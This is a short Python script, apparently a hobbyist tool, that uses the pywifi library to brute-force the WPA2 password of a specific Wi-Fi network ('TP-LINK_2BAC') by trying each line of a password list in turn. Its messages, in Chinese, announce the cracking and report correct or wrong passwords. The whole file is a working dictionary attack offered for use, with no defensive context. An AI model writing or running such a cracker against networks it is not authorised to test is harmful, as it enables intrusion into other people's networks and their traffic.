# Author:Kali Yu

import pywifi
from pywifi import const
import time

def connect(passwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)

    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()

        profile.ssid = 'TP-LINK_2BAC'
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = passwd
        ifaces.remove_all_network_profiles()

        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)

        time.sleep(4)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print('已经链接')

def readPassword():
    print('开始破解:')
    path = 'pass.txt'
    filename = open(path, 'r')
    while True:
        try:
            passStr = filename.readline()
            bool = connect(passStr)
            if bool:
                print('密码正确',passStr)
                break
            else:
                print('密码错误',passStr)
        except:
            continue
readPassword()